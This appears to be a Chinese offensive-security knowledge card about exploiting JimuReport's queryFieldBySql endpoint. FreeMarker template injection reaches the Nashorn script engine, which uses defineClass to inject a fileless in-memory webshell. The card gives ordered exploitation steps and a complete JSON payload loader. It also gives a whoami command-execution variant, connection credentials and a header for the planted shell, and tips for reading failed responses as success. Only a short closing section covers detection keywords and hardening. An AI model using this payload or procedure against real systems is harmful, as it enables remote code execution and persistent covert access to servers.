---
id: web-java-component-jimureport-queryfieldbysql-objectconstructor-nashorn-memshell
title: JimuReport queryFieldBySql 的 FreeMarker ObjectConstructor 链：经 ScriptEngineManager 取 Nashorn 执行 JS，再用 defineClass 注入内存马；渲染阶段即执行、SQL 报错不代表失败
type: scenario
domain: web
path: web/java/component
technique: jimureport-queryfieldbysql-objectconstructor-nashorn-defineclass
aliases:
- JimuReport ObjectConstructor 内存马
- queryFieldBySql 内存马注入
- freemarker ObjectConstructor ScriptEngineManager
- FreeMarker 转 Nashorn 执行 JS
- defineClass 注入 Filter 内存马
- 积木报表内存马
- JeecgBoot 报表 getshell
tags:
- java
- freemarker
- ssti
- jeecgboot
- jimureport
- nashorn
- scriptengine
- defineclass
- memshell
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:03:47+08:00'
  notes: '已对照原文核对：/jmreport/queryFieldBySql 把 sql 当 FreeMarker 模板渲染、ObjectConstructor?new 构造 ScriptEngineManager、getEngineByName(js).eval 走 Nashorn、JS 内 getContextClassLoader + 反射 defineClass + newInstance 注册内存马、Base64 三路回退、call 前缀、以及 success:false + sql_injection violation 但载荷已执行（原文图 03 响应与图 04 蚁剑连接）均与原文一致；JDK 8~14 Nashorn 约束已在边界写明。核对中修正连接要素：原卡误写 Shiro 入口的 /favicondemo.ico、pass1024，已按原文图 03/04 改为本卡 JimuReport 入口的密码 Cslbewkahmg 与 Referer: Hftaa；原文未给 JimuReport 受影响版本区间（图 04 的 jeecg-system-start-3.5.1.jar 属目标环境），已 --clear affected_versions。未验证点：未复现目标环境。'
---

## 一句话结论

JimuReport 的 `/jmreport/queryFieldBySql` 把请求里的 `sql` 当 FreeMarker 模板先渲染再交给数据库，因此可以在模板里用 `freemarker.template.utility.ObjectConstructor?new()` 构造 `javax.script.ScriptEngineManager`，取出 `js`（Nashorn）引擎并 `eval` 一段 JavaScript；JS 里用线程 `ContextClassLoader` + 反射 `defineClass` 加载 Base64 字节码并 `newInstance()`，即可在不落盘的情况下注册 Listener/Filter 内存马。关键的两个实操细节是：模板表达式在**渲染阶段**就已执行（后面 SQL 语法错误只影响取数，不影响命令已执行），以及给整段加一个 `call` 前缀能减少对 `sql` 字段形态校验的干扰。

## 原理

- **入口仍然只是“SQL 被当模板渲染”**：`/jmreport/queryFieldBySql` 把 `sql` 字符串交给 FreeMarker 渲染，再把渲染结果交给数据库执行。渲染是不可信字符串 → 模板，因此 `${...}`、`<#assign ...>` 里的表达式求值发生在执行 SQL 之前。
- **为什么不用 `Execute` 而用 `ObjectConstructor`**：`freemarker.template.utility.Execute` 是单一命令执行类，在 SAFER_RESOLVER 收紧后被普遍拦截；`ObjectConstructor` 是通用构造器，接受“类名 + 构造参数”，可构造任意带公开构造器的类。用它构造 `javax.script.ScriptEngineManager`（无参构造）后，`getEngineByName("js")` 在 JDK 8~14（自带 Nashorn）的容器里返回一个可 `eval` 的 JavaScript 引擎。
- **为什么绕到脚本引擎**：表达式层能做的只是取对象/调方法；把整段逻辑写进 JS 字符串交给 Nashorn，就等于在 JVM 内拿到完整 Java 能力（`java.lang.Class`、反射、`getBytes`），不受模板语法的引号、逗号、空格限制。JS 里的写法是 `classLoader = java.lang.Thread.currentThread().getContextClassLoader()`，然后 `loadClass('java.lang.ClassLoader').getDeclaredMethod('defineClass', [byte[], int, int])`、`setAccessible(true)`、`invoke(classLoader, bytecode, 0, length)`、`clazz.newInstance()`。
- **为什么用 defineClass 而不是落盘 JSP**：`defineClass` 直接在目标 ClassLoader 里定义类，类字节不落盘、无文件时间戳，进程重启即消失；`newInstance()` 触发类的构造/静态初始化，内存马（如 Tomcat Listener/Filter、Spring 拦截器）就是在构造器里把自身注册进容器。原文生成的马就是 Listener 形态（`org.apache.logging.ServletRequestLcyListener`），密码与请求头分别用于鉴权。
- **Base64 解码的多路径兼容**：JS 里先试 `java.util.Base64.getDecoder().decode(...)`；若目标为较老 JDK/受限环境，回退 `javax.xml.bind.DatatypeConverter.parseBase64Binary(...)`；再回退 `sun.misc.BASE64Decoder.decodeBuffer(...)`。三套都失败才整体失败，因此同一段 payload 能跨 JDK 版本复用。
- **`call` 前缀的作用**：payload 以 `call${...}` 开头。`call` 是 SQL 的存储过程调用关键字，把渲染结果放在 `call` 之后，使渲染后的字符串更像一条 SQL 语句；即使内容最终仍被判为非法（原文响应可见 `sql_injection violation, syntax error ... expect CALL`），模板渲染已发生、JS 已执行。这一步不是必须，但在启用了 SQL 语法/SQL 注入检测的 JimuReport 上能减少“渲染前先被规则拦住”的概率。
- **响应返回失败 ≠ 利用失败**：原文该请求的响应体是 `{"success":false,"message":"CallableStatementCallback; ... sql_injection violation, syntax error ...","code":1001}`，但内存马已经注册、蚁剑随后连接成功。原因就是执行顺序：模板渲染 → JS 执行 → 数据库执行 SQL，失败发生在最后一步。判定必须用“马能否连上/是否有回连”，而不是看 JSON 的 `success`。
- **前置条件**：目标为 JeecgBoot + JimuReport 报表模块，`/jmreport/queryFieldBySql` 可达且未被拦截；FreeMarker 未配置 `ALLOWS_NOTHING_RESOLVER` 级别的严格白名单（默认解析器允许 `?new` 常用类）；JVM 带 Nashorn（JDK 8~14）或 classpath 有其它脚本引擎；`sql` 字段能接受 `${...}` 表达式。

## 触发条件

- 目标集成 JimuReport（JeecgBoot 报表模块），并且 `/jmreport/queryFieldBySql` 能从攻击位置访问。
- FreeMarker 的类解析器允许 `?new` 构造 `ObjectConstructor`/`Execute` 等类（默认配置即允许）。
- JVM 存在 `js` 脚本引擎（Nashorn，JDK 8~14）；JDK 15+ 需 classpath 另有引擎（Groovy/Jython 等）才能走同一路。
- `sql` 参数没有做“必须为纯 SQL”的强校验，或校验发生在渲染之后。
- 目标进程账户可注册 Listener/Filter（Tomcat 下通常是应用账户，足够）。

## 利用步骤

1. **确认入口与渲染**：向 `/jmreport/queryFieldBySql` 发 `{"sql":"select '1'"}`，确认返回解析成功；再用 `${7*7}` 之类的表达式看渲染结果是否被求值。
2. **验证 `?new` 可用**：用 `${"freemarker.template.utility.ObjectConstructor"?new()("javax.script.ScriptEngineManager")}` 探测是否抛类解析异常（抛错说明 resolver 收紧，需要换其它链路）。
3. **生成内存马字节码**：用内存马生成器（原文用 java-memshell-generator）产出 Listener/Filter 形态的 Base64 字节码，并记录三项连接要素：密码、请求路径、鉴权请求头。
4. **拼 JS 装载器**：把字节码 Base64 塞进 JS 字符串变量，依次尝试 `Base64.getDecoder` / `DatatypeConverter` / `sun.misc.BASE64Decoder` 解码，再用 `defineClass` + `newInstance` 定义并注册。
5. **组装模板 payload**：`call${"freemarker.template.utility.ObjectConstructor"?new()("javax.script.ScriptEngineManager").getEngineByName("js").eval("<JS>")}`，注意模板字符串内的双引号转义与 JSON 编码。
6. **发送并判读**：只看响应是否有 `sql_injection violation` 之类的 SQL 错误，不据此判断失败；随后用生成器给的路径 + 密码 + 请求头连马。
7. **失败排查**：能渲染但不执行多因 JDK 无 js 引擎（JDK15+）或 resolver 收紧；执行了但连不上多因内存马形态与容器不匹配（Tomcat 用 Listener/Filter，Spring 用 Interceptor/Controller）、请求头名/密码不符、路径被网关拦截。
8. **清理意识**：内存马不落盘，进程重启即失效；若已写入文件或改了配置需单独清理。

## PoC

最小探测（渲染是否求值）：

```json
{"sql":"select '${7*7}'"}
```

ObjectConstructor → Nashorn 装载器（结构，JS 内为原文思路的等价重写）：

```json
{"sql":"call${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();bytecodeBase64='<Base64 内存马字节码>';clsString=classLoader.loadClass('java.lang.String');clsBase64=classLoader.loadClass('java.util.Base64');decoder=clsBase64.getMethod('getDecoder').invoke(clsBase64);bytecode=classLoader.loadClass('java.util.Base64$Decoder').getMethod('decode',clsString).invoke(decoder,bytecodeBase64);clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();\")}","dbSource":"","type":"0"}
```

预期响应（原文实测）：`200 OK`，body 为 `success:false` + `CallableStatementCallback ... sql_injection violation, syntax error ... expect CALL`；但模板已渲染、JS 已执行。

连接内存马（原文实测要素）：路径 `http://10.10.0.3:18088/jeecg-boot/jmreport/queryFieldBySql`、密码 `Cslbewkahmg`、请求头 `Referer: Hftaa`（原文图 03/04）；连接成功说明注入生效。注意这些要素属于本卡的 JimuReport 入口，不要与同篇 Shiro 入口（`/favicondemo.ico`、`pass1024`、Tomcat 18080 端口）混淆。

注意：`eval` 内的 JS 需要把双引号全部转义或用单引号；`${...}` 内部出现 `}`、引号时要以 JSON 编码后再发送，避免被 JSON 解析截断。

## 变体与关联

- 变体：把 `ObjectConstructor` 换成 `Execute` 直接执行系统命令（`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}`），前提是 resolver 未收紧；这是更快但更易被拦的路径。
- 变体：JDK 8~14 之外无 Nashorn 时，用 classpath 上已有的 Groovy/Jython/EL 引擎替代 `js`；或直接用模板反射链（`object.class.protectionDomain.classLoader`）加载 `TemplatesImpl`。
- 变体：内存马形态按容器选：Tomcat Listener/Filter、Spring `RequestMappingHandlerMapping` 注册 Controller、Weblogic Filter；同一份字节码装载器只需换 Base64。
- 关联：[[web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce]]（同端点的 Aviator `ReflectUtils.defineClass` 路线，本卡是 ObjectConstructor→Nashorn 路线）。
- 关联：[[web-java-component-jimureport-save-cell-expression-injection-rce]]（`/jmreport/save` 单元格表达式的 `Execute` 路线）。
- 关联：[[web-java-classloader-deserialization-memshell-loader-selection]]（脚本引擎 + `defineClass` 在其它入口的装载器选型）。
- 关联：[[web-generic-ssti-freemarker-safer-resolver-bypass]]（`SAFER_RESOLVER` 只黑名单三类原生类，`ObjectConstructor` 正是被点名的一类，收紧后需换链）。
- 边界：原文未标注 JimuReport 受影响版本；`?new` 是否可用取决于 resolver 与 FreeMarker 版本；Nashorn 在 JDK 15+ 已移除。

## 检测与防御

- 检测：`/jmreport/queryFieldBySql`（及 `/loadTableData`、`/save`）请求体 `sql` 中出现 `${`、`?new`、`ObjectConstructor`、`ScriptEngineManager`、`getEngineByName`、`eval(`、`defineClass`、`getContextClassLoader`、`Base64` 等组合；对 JSON 值先做 Base64/反转等简单解码后再匹配一次。
- 检测：同一接口短时间内“SQL 语法错误”响应激增（`sql_injection violation`、`expect CALL`）而客户端并未停止重试；JVM 内出现未在发布包中的类名（可用 RASP/agent 枚举 `defineClass` 调用）。
- 防御：不需要报表模块时下线 JimuReport；至少对 `/jmreport/*` 做真实鉴权并限制来源网段。
- 防御：FreeMarker 配置 `ALLOWS_NOTHING_RESOLVER` 或自定义白名单 `TemplateClassResolver`，禁止 `?new`/`?api`；不要在模板上下文暴露任意 Java 对象与方法。
- 防御：把“SQL 模板渲染”改成“参数化查询 + 固定模板”，不要允许用户控制待渲染模板；对报表自定义 SQL 功能仅开放给可信角色并审计。
- 防御：移除或限制脚本引擎（Nashorn/Groovy/Jython）与 `ScriptEngineManager` 的使用；生产 JDK 尽量用不含 Nashorn 的版本。
- 通用原则：模板渲染阶段执行的代码不受后续 SQL 成败影响，任何“看响应成功与否”的判定都可能漏报。
